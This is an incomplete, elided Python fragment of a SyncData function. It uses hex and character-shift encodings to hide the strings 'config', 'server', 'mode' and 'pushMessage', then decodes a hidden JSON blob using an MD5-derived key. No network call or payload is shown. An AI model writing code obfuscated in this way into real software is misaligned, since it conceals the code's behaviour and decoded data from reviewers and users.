...
def SyncData():
    ...
    st = vars()[bytes.fromhex('636f6e666967').decode()]
    ...
    w = st[bytearray([(ord(c)-32-5)%95+32 for c in "xjw{jw"]).decode()\
    ]["".join(bytearray([(ord(c)-32-5)%95+32 for c in "rtij"]).decode())]
    ...
    raqve = __import__('json').loads("".join([chr(
    int(V)-ord(__import__('hashlib').md5(AC.encode()).hexdigest()[
    I % 32])) for s in [vars()[eval('chr(101)')]] for char in [w]
    for I,V in enumerate(s.split(",")) for AC in [char]]))
    ...
    chr((ord(c)-32-2)%95+32), "rwujOguucig"))]=\
    eval("".join([chr(114), chr(97), chr(113), chr(118), chr(101)]))
